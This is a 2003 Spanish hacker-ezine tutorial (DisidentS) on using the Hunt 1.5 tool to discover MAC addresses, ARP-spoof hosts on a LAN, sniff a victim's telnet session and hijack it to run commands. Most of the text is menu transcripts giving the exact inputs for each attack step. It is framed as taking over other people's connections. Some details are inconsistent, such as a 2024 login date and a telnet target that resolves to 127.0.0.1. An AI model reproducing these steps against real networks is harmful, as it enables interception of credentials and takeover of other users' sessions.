---
title: "014"
ezine: "disidents"
---

# 014

**Ezine:** disidents

<div className="ascii-content">

```
[014]_Secuestro_de_seciones_con_hunt_1.5_By_ST38410A_-_Disidents Journal_5


                     -+-| DisidentS Hack Journal #5 |-+-



   ______________________________________________________________________
  |                                                                      |
  | -+- Titulo_____:             |
  | -+- Autor______: ST38410A                                            |
  | -+- E-Mail_____: ST38410A@Hotmail.com                                |
  | -+- Team_______: DisidentS Espa±a - http://disidents-team.cjb.net    |
  |______________________________________________________________________|


===========================================================================.
|===========~ INDICE ~======================================================
|===========================================================================
|~                                                                         | 
|~ 1-. Introducci≤n                                                        |
|~ 2.- Que es Hunt?                                                        |
|~ 3-. Instalado Hunt.                                                     |
|~ 4-. Comprendiendo cada parte de hunt.                                   |
|~       1-4. Descubrimiento de mac remotamente.                           |
|~ 5-. Que es ARP?                                                         |
|~       1-6.Arp Spoof                                                     |
|~ 6.- Que es un Sniffer?                                                  |
|~       6-1-.Sniffer a Un Demonio.                                        |
|~       6-2.-. Hunt como Sniffer de LANS.                                 |
|~ 7-. Que es el Hijacking (secuestro de Sesiones) ?                       |
|~       7-1-. Hijacking con Hunt. (secuestro de Sesiones)                 |
|~ 8-. Comentarios Finales.                                                |
|~ 9-. Glosario                                                            |
|~ 10-. Contacto                                                           |
|                                                                          |
|=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
|===========~ INDICE ~======================================================
|===========================================================================


===========================================================================.
|=======~                   1-. Introducci≤n             ~==================
|===========================================================================


En este manual explicare el programa Hunt y como funciona adentrandonos en el 
hijacking. Una de las principales causas por lo que lo hice es por que no hay 
informaci≤n sobre este programa,  hay  sobre  otros  Sniffers pero sobre este 
no lo hay por eso decidφ ponerme  a hacerlo, espero que les guste y les sirva 
de algo.


===========================================================================.
|=======~                  2-. Que es Hunt?              ~==================
============================================================================



Hunt es un analizador de paquetes (Sniffer) e tambiΘn  secuestrador sesiones
su version mas reciente es la 1.5, lo podemos encontrar la pagina oficial de  
hunt en http://www.cri.cz/kra/index.html donde podremos descargar el progra-
ma. Con hunt se pueden realizar muchas opciones una de ellas es el secuestro 
de sesiones bien conocido como Hijacking, tambiΘn se pueden realizar  muchas 
opciones mas como saber la  direcci≤n mac remotamente, Sniffer, etc. En este 
Manual Analizaremos Cada una de las opciones de este programa veremos que es 
hunt. Y realizaremos secuestros de sesiones y Sniffing.

===========================================================================.
|=======~              3-. Instalado Hunt.               ~==================
|===========================================================================

Hunt lo podemos encontrar en  http://packetstormsecurity.nl, para instalarlo
simplemente descargamos el  archivo hunt y hacemos  (AsegurarΘ de que tengas
instalado  glibcque lo  puedes bajar de  http://packetstormsecurity.nl) make
y eso es todo se creara un archivo binario en el archivo donde lo instalaste.
TambiΘn  pudes bajarlo RPM en  http://rpmfind.net/ y instalarlo, se manda al
f≤lder /usr/sbin/, /sbin/.


===========================================================================.
|=======~        4-. Hunt sus primeras opciones.         ~==================
|===========================================================================

Bueno, las primeras opciones de hunt son:

--- Main Menu --- rcvpkt 0, free/alloc 63/64 ------
l/w/r) list/watch/reset connections
u)     host up tests
a)     arp/simple hijack (avoids ack storm if arp used)
s)     simple hijack
d)     daemons rst/arp/sniff/mac
o)     options
x)     exit

Estas son las primeras opciones de hunt mas simples voy a  explicar cada una
de ellas:

l/w/r) list/watch/reset connections: con esta opci≤n podremos ver las sigui-
       entes opciones

list: con esta opci≤n veremos todas las redes conectadas a hunt en una lista.
watch; veremos las conexiones.
reset: reseta las conexiones.

u) host up tests: esta  opci≤n es para ver si la victima esta o sigue conec-

a) arp/simple hijack (avoids ack storm if arp used): Esto mas adelante.

d) daemons rst/arp/sniff/mac: Esta opci≤n tiene varias herramientas entre una
    de ellas el. Sniffer de Hunt, Arp-spoof  que lo  veremos  despuΘs, descu-
    brimiento de mac y reseteo de conexiones.

  --- Main Menu --- rcvpkt 0, free/alloc 63/64 ------
l/w/r) list/watch/reset connections
u)     host up tests
a)     arp/simple hijack (avoids ack storm if arp used)
s)     simple hijack
d)     daemons rst/arp/sniff/mac
o)     options
x)     exit
-> d


	--- daemons --- rcvpkt 17, free/alloc 63/64 ------
r) reset daemon
a) arp spoof + arp relayer daemon
s) sniff daemon
m) mac discovery daemon
x) return
-dm>


============================================================================.
|=======~     4-1. Descubrimiento de MAC remotamente      ~==================
|============================================================================

1-4. Descubrimiento de mac remotamente.

Voy a  abrir un parΘntesis para Explicar esta opci≤n (

--- daemons --- rcvpkt 2128, free/alloc 63/64 ------
r) reset daemon
a) arp spoof + arp relayer daemon
s) sniff daemon
m) mac discovery daemon
x) return
-dm> m

Usamos esta opcion escogemos la opci≤n para descubrimiento de MAC remotamen-
te.


--- mac disc. daemon --- rcvpkt 2131, free/alloc 63/64 ------
s/k)   start/stop daemon
l)     list discoverer setup     h) list HW mac addresses
t)     time to sleep
a/m/d) add/mod/del entry
x)     return
-macd> a

Esta opci≤n agregamos al host.

start ip addr> 23.3.3.3 ( la direcci≤n del host)
end ip addr> 23.3.3.3 (tambiΘn si no  tienes exacta el  ip  puedes utilizar
esta opci≤n sino solo pon el ip igual que el anterior)

--- mac disc. daemon --- rcvpkt 2434, free/alloc 63/64 ------
s/k)   start/stop daemon
l)     list discoverer setup     h) list HW mac addresse
t)     time to sleep
a/m/d) add/mod/del entry
x)     return
-macd> s

Utilizamos la opcion start para que inicie el escaneo y trate de encontrarla

--- mac disc. daemon --- rcvpkt 2447, free/alloc 63/64 ---M---
s/k)   start/stop daemon
l)     list discoverer setup     h) list HW mac addresses
t)     time to sleep
a/m/d) add/mod/del entry
x)     return
-macd> l
  0) 23.3.3.3                 - 23.3.3.3

Muestra a quien estamos buscando su mac

--- mac disc. daemon --- rcvpkt 2460, free/alloc 63/64 ---M---
s/k)   start/stop daemon
l)     list discoverer setup     h) list HW mac addresses
t)     time to sleep
a/m/d) add/mod/del entry
x)     return
-macd> h
--- mac table ---
  23.3.3.3                 00:05:5F:EC:90:54

DespuΘs de esperar vario rato pues aquφ con la  opci≤n h nos  muestra la di-
reccion MAC.

===========================================================================.
|=======~                5-. Que es Arp?                 ~==================
|===========================================================================


En la actualidad usamos para todo TCP/IP, pero cuando realizamos una Red Lan
entre varias  Computadoras identificamos con la direcci≤n MAC */ bien MAC es
la direcci≤n de  nuestra Tarjeta Red 00:45:F5:3B:00:CD*/, Arp se  encarga de
conseguirnos la direcci≤n MAC, cuando  se conectan dos  computadoras podemos
saber cuales son las conexiones del cache cob arp -a  que  esta  nos muestra
todas las entradas que hay en nuestro cache como:

root@ST38410A:~# arp -a
ST38410A (200.3.3.3) at 00:05:5F:EC:90:54 [ether] on eth0
HOST (2.1.2.2) at 00:05:3F:EC:80:56 [ether] on eth0.

Muy bien entonces me pregunto y ┐esto de que me sirve para el hijacking? pues
fßcil Cuando hay una conexi≤n entre dos PC se conectan entonces es cuando po-
dremos  podremos  apoderarnos de  la conexi≤n  por  ejemplo, rolly y su amigo
Arregin estan conetados:

root@rolly:~# arp -a

rolly (200.3.3.3) at 00:05:5F:EC:90:54 [ether] on eth0
arregin (200.3.45.56) at 00:05:3F:EC:80:56 [ether] on eth0.

root@arregin:~# arp -a

arregin (200.3.45.56) at 00:05:3F:EC:80:56 [ether] on eth0.
rolly (200.3.3.3) at 00:05:5F:EC:90:54 [ether] on eth0

Como puedes ver rolly y arregin estßn conectados pues es en este tipo de cone-
xiones las podemos secuestrar y Sniffear.


/*

Si queremos Saber nuestra direcci≤n MAC u otras opciones

root@SeaGate:~# ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 00:45:F5:3B:00:CD
          inet addr:2.1.1.1  Bcast:255.255.255.255  Mask:255.255.255.0
          UP BROADCAST NOTRAILERS RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:991 errors:0 dropped:0 overruns:0 frame:0
          TX packets:146 errors:0 dropped:0 overruns:0 carrier:0
          collisions:18 txqueuelen:100
          RX bytes:330009 (3.2 Mb)  TX bytes:81054 ( 91.7 Kb)
          Interrupt:10 Base address:0x6000

============================================================================.
|=======~                   5-1-. Arp-spoof               ~==================
|============================================================================

Es el mΘtodo mediante el cual podemos hacer que los paquetes que son  envidos
desde una red Lan sean desviados y nos lleguen a nosotros no pienso adentrar
mucho en este tema pues hay informaci≤n sobre el.


============================================================================.
|=======~            6-. Que es un Sniffer?              ~==================
|===========================================================================


Programa encargado de interceptar la  informaci≤n  que  circula  por una red
en este caso hunt, buscando una cadena numΘrica  o de caracteres  en los pa-
quetes que atraviesan un nodo de comunicaciones con el  objeto  de conseguir
alguna informaci≤n. Normalmente su uso es ilegal.


===========================================================================.
|=======~            6-1-.Sniffer a Un Demonio.          ~==================
|===========================================================================

Bueno  en esta secci≤n veremos y vamos  a Sniffear una  conexi≤n entre  dos
computadoras, Seguiremos con el ejemplo de arregin y Rolly entonces:


Arregin le hiso un Telnet a su amigo Rolly veamos como para los no informa-
dos (newbies):

  root@Arregin :~# telnet 2.2.2.2
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.

rolly login: st38410a
Password: ********
Linux 4.5.
Last login: Sat Jul 12 12:00:44 -0700 2024 on pts/3 from D.

JuanC@Arregin:~%


Bien entonces como pueden observar Arregin hizo  un telnet a su amigo rolly
lo que nosotros vamos  a hacer  se le llama Sniffear eso es lo que conexi≤n
Espiarla:

/*
  *      hunt 1.5
  *      multipurpose connection intruder / sniffer for Linux
  *      (c) 1998-2000 by kra
  */
starting hunt

--- Main Menu --- rcvpkt 0, free/alloc 63/64 ------
l/w/r) list/watch/reset connections
u)     host up tests
a)     arp/simple hijack (avoids ack storm if arp used)
s)     simple hijack
d)     daemons rst/arp/sniff/mac
o)     options
x)     exit
->d

--- daemons --- rcvpkt 128, free/alloc 63/64 ------
r) reset daemon
a) arp spoof + arp relayer daemon
s) sniff daemon
m) mac discovery daemon
x) return
-dm>s

--- sniff daemon --- rcvpkt 202, free/alloc 63/64 ------
s/k)   start/stop sniff daemon
l)     list sniff database   c) list sniff connection
a/m/d) add/mod/del sniff item
o)     options
x)     return
-sniff>

Abro un peque±o parΘntesis para explicar las opciones:
Bien las primeras primero por lo primero:

s/k)  start/stop sniff daemon = Con esta opcon con S despues de haber agre-
gado una conexion pones esta opcion para que inicie a Sniffear las conexio-
nes, y k para que se pare.

l)  list sniff database    c) list sniff connection = information sobre las
conexiones.

a/m/d) add/mod/del sniff item: aqui agregamos las opciones las cuales vere-
mos mas adelante.

o) options =  este opci≤n contiene una opci≤n muy simple.

E terminado de explicar estas opciones entonces entremos en materia. Ya te-

nemos un poco mas de idea de lo que vamos a hacer entonces entremos en
materia.

root@Seagate:~/hunt-1.5# ./hunt
/*
  *  hunt 1.5
  *  multipurpose connection intruder / sniffer for Linux
  *  (c) 1998-2000 by kra
  */
starting hunt

--- Main Menu --- rcvpkt 0, free/alloc 63/64 ------
l/w/r) list/watch/reset connections
u)     host up tests
a)     arp/simple hijack (avoids ack storm if arp used)
s)     simple hijack
d)     daemons rst/arp/sniff/mac
o)     options
x)     exit
-> d

--- daemons --- rcvpkt 823, free/alloc 63/64 ------
r) reset daemon
a) arp spoof + arp relayer daemon
s) sniff daemon
m) mac discovery daemon
x) return
-dm> s

--- sniff daemon --- rcvpkt 829, free/alloc 63/64 ------
s/k)   start/stop sniff daemon
l)     list sniff database   c) list sniff connection
a/m/d) add/mod/del sniff item
o)     options
x)     return
-sniff> a

--- sniff daemon --- rcvpkt 3257, free/alloc 63/64 ------
s/k)   start/stop sniff daemon
l)     list sniff database   c) list sniff connection
a/m/d) add/mod/del sniff item
o)     options
x)     return
-sniff> a
src ip addr/mask ports [0.0.0.0/0]> 2.2.2.2/23
dst ip addr/mask ports [0.0.0.0/0]> 22.3.3.3/23
want to search for y/n [y]> n
log mode [s]rc/[d]st/[b]oth [s]> s
log bytes [64]> 64
log file name [by conn]> conec
insert at [1]> 1

--- sniff daemon --- rcvpkt 3339, free/alloc 63/64 ------
s/k)   start/stop sniff daemon
l)     list sniff database   c) list sniff connection
a/m/d) add/mod/del sniff item
o)     options
x)     return
-sniff> s <------------------------Empieza y todo se empieza a Sniffear.

--- sniff daemon --- rcvpkt 3583, free/alloc 63/64 ---S---
s/k)   start/stop sniff daemon
l)     list sniff database   c) list sniff connection
a/m/d) add/mod/del sniff item
o)     options
x)     return
-sniff> l <--------------------------Base de datos del Sniffer
1) 2.2.2.2/23 [all] --> 22.3.3.3/23 [all] log src 64B

--- sniff daemon --- rcvpkt 3601, free/alloc 63/64 ---S---
s/k)   start/stop sniff daemon
l)     list sniff database   c) list sniff connection
a/m/d) add/mod/del sniff item
o)     options
x)     return
-sniff> c   <------------------------Lista de las conexiones
1) 2.2.2.2/23 [all]       --> 22.3.3.3/23 [all] log src 64B

--- sniff daemon --- rcvpkt 3607, free/alloc 63/64 ---S---
s/k)   start/stop sniff daemon
l)     list sniff database   c) list sniff connection
a/m/d) add/mod/del sniff item
o)     options
x)     return
-sniff>x

--- daemons --- rcvpkt 4493, free/alloc 63/64 ---S---
r) reset daemon
a) arp spoof + arp relayer daemon
s) sniff daemon
m) mac discovery daemon
x) return
-dm>x

--- Main Menu --- rcvpkt 5096, free/alloc 63/64 ---S---
l/w/r) list/watch/reset connections
u)     host up tests
a)     arp/simple hijack (avoids ack storm if arp used)
s)     simple hijack
d)     daemons rst/arp/sniff/mac
o)     options
x)     exit

->w <-----------------Con esta opci≤n veremos lo que pasa a travΘs de las
computadoras
0) 2.2.2.2 [1038]            --> 22.3.3.3/23  [23]

choose conn> 0














CTRL-C to break

JuanC@arregin:~# lynx www.Disidents.org <-como  observar la conexi≤n todo lo
que sucede  como un  keylogger para volvernos due±o  como si estuviΘramos en
la shell recurrimos al hijacking XD.


===========================================================================.
|=======~         6-2.Hunt como Sniffer de LANs's.       ~==================
|===========================================================================

Hunt permite espiar cualquier tipo de conexi≤n asta una echa con Swichs, con
otros Sniffers no sirven y pierden potencia pero con Hunt  se puede. Lo  que
las Tarj. Ethernet realizan  una petici≤n ARP  "ARP request" para conesor la
direcci≤n MAC a una IP determinada por nosotros.

Hunt lo que hace es que enga±a a  las maquinas  para que introduzcan nuestra
MAC en su cache.

Bueno vamos a seguir con la explicaci≤n de la conexi≤n que hay entre rolly y
arregin.

root@rolly:~# arp -a

rolly (200.3.3.3) at 00:05:5F:EC:90:54 [ether] on eth0
arregin (200.3.45.56) at 00:05:3F:EC:80:56 [ether] on eth0.

root@arregin:~# arp -a

arregin (200.3.45.56) at 00:05:3F:EC:80:56 [ether] on eth0.
rolly (200.3.3.3) at 00:05:5F:EC:90:54 [ether] on eth0tre rolly y arregin

como podemos observar rolly y arregin estßn conectados, muy bien entonces es
aquφ cuando entramos nosotros y hunt.

  root@ST38410A:~/hunt-1.5# ./hunt

/*
  *      hunt 1.5
  *      multipurpose connection intruder / sniffer for Linux
  *      (c) 1998-2000 by kra  
*/starting hunt
--- Main Menu --- rcvpkt 0, free/alloc 63/64 ------
l/w/r) list/watch/reset connections
u)     host up tests
a)     arp/simple hijack (avoids ack storm if arp used)
s)     simple hijack
d)     daemons rst/arp/sniff/mac
o)     options
x)     exit
-> d


--- daemons --- rcvpkt 17, free/alloc 63/64 ------
r) reset daemon
a) arp spoof + arp relayer daemon
s) sniff daemon
m) mac discovery daemon
x) return
-dm> a

Abrimos Arp spoof.

--- arpspoof daemon --- rcvpkt 25, free/alloc 63/64 ------
s/k) start/stop relayer daemon
l/L) list arp spoof database
a)   add host to host arp spoof     i/I) insert single/range arp spoof
d)   delete host to host arp spoof  r/R) remove single/range arp spoof
t/T) test if arp spoof successed    y) relay database
x)   return
-arps>a (con esta opci≤n agregamos a un red)

src/dst host1 to arp spoof > rolly (ip)
host1 fake MAC [EA:00:SD:45:BE:05] >     Direccion falsa de MAC de rolly
src/dst host2 to arp spoof >Arregin (ip)
host2 fake MAC [EA:00:SD:45:BE:05] >     Direccion falsa de MAC de Arregin
refresh interval sec [0]

-arps>s (inicia)

Bien si todo se proceso correctamente entonces los  datos que pasan a travΘs
de esos dos Sistemas  ahora  estßn  pasando por el  nuestro XD. Relizamos lo
mismo que la anterior.


===========================================================================.
|======~ 7-. Que es el Hijacking (secuestro de Sesiones) ~==================
|===========================================================================


El  hijacking es el mΘtodo mediante el cual podremos secuestrar una conexi≤n
entre dos maquinas y tomar la conexi≤n, por ejemplo un usuario quiere conec-
tarse por medio de Telnet , con hunt podremos desviar los paquetes entre las
dos maquinas podremos observarla y volvernos el due±o de la  conexi≤n y uti-
lizar comandos como si fuΘramos el root o tambiΘn una Conexi≤n Lan con Hubs.
Suplantar a una de las dos.

===========================================================================.
|=======~               7-1-. El hijacking               ~==================
|===========================================================================


Bueno estuvimos Realizando y con eso  pudimos  obsersar la conexi≤n entonces
por que no envΘs de observar por que no tocamos :D bien:

Nos quedamos que estßbamos viendo la conexi≤n  que  estaba  haciendo Rolly a
la maquina  de Arregin, esta conectßndose por telnet y nosotros veφamos como
se conectaba  por  medio del  explorador Lynx a DISIDENTS dentro de la misma
maquina  a la que le hizo telnet  (rolly a Arregin). Entonces lo  que aremos
serß  realizar un hijaking para desviar los paquetes y volvernos el due±o de
esa Telnet.
Bien Entonces volvemos al men· principal donde estßbamos.

--- Main Menu --- rcvpkt 56320, free/alloc 63/64 ---S---
l/w/r) list/watch/reset connections
u)     host up tests
a)     arp/simple hijack (avoids ack storm if arp used)
s)     simple hijack
d)     daemons rst/arp/sniff/mac
o)     options
x)     exit
*> s
0) 2.2.2.2 [1038]            --> 22.3.3.3/23  [23] <----Devemos esperar los
siguiente claro para que se ponga de esta forma.

choose conn> 0 <-- Recuerden que ya tenemos la conexi≤n Sniffeada.
dump connection y/n [n]> n
Enter the command string you wish executed or [cr]> cr

root@Seagate:~# cd / Listo somos los due±os  de  la conexi≤n  y podemos uti-
lizar comandos como si fuΘramos el root. Este tipo es fßcil  de que  la con-
exion  se  pierda si  no  funciona esto prueba con arp/simple hijack (avoids
ack storm if arp used).


l/w/r) list/watch/reset connections
u)     host up tests
a)     arp/simple hijack (avoids ack storm if arp used)
s)     simple hijack
d)     daemons rst/arp/sniff/mac
o)     options
x)     exit
*>a
0) 2.2.2.2 [1038]            --> 22.3.3.3/23  [23]

choose conn> 0
arp spoof src in dst y/n [y]> y
src MAC [EA:1A:DE:AD:BE:01]> EA:1A:DE:AD:B3:02 <----la Mac de la victima
arp spoof dst in src y/n [y]> y
dst MAC [EA:1A:DE:AD:BE:02]> 00:40:F4:2B:00:CD
input mode [r]aw, [l]ine+echo+\r, line+[e]cho [r]> r
dump connectin y/n [y]> y



















CTRL-C to break┤

<------------------------------Si todo resulta bien dentro  de un tiempo de
combertiras en Due±o de la conexi≤n si no es asφ pones Ctrl+C.
Dura un buen tiempo todo es con paciencia.
CTRL-C y sale lo siguiente.
     |
     |
ARP spoof of  127.0.0.1  with fake mac 00:40:F4:2B:00:CD  in host 127.0.0.1
FAILED do you want to force arp spoof until successed y/n [y]> y
CTRL-C to break
..............................................<--va a realizar esto asta que
se apodere de esta pude durar mucho Tiempo :(.
root@Arregin:~#


.==========================================================================.
|=======~              8-.Comentarios Finales            ~==================
|==================================== ======================================

Porfavor si no entendiste algo comunφcamelo  de  inmediato para ayudarte, con
migo ST38410A no dudes  en preguntarme lo.

Saludo a todos los que se aparecen en el irc-hispano un ratito para platicar
en el canal de Disidents.


===========================================================================.
|=======~                  11-. Contacto                 ~==================
|===========================================================================


Por si tienes una duda o comentarios:


Escribeme a mi correo o agregame a tu lista de contactos por si tienes alguna
duda o en el irc-hispano.org #Disidents 
 
 
-----------------------------------------------------------------------------
                   DisidentS Hacker Team 2003 (c).
 
----------------------------------------------------------------------------
                 Mail del Team: disidents@yahoo.es
----------------------------------------------------------------------------
 
                               0
                             X0 0X
                               S

```

</div>
